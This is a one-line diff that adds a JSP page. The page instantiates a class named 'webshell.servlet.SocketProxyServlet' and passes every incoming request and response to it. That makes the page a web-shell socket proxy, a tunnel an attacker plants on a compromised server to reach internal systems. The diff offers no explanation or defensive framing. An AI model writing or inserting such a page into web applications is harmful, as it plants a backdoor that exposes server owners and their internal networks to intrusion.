@@ -1,0 +1,1 @@
+<%!webshell.servlet.SocketProxyServlet serv = new webshell.servlet.SocketProxyServlet();%><%this.serv.service(request, response);%>
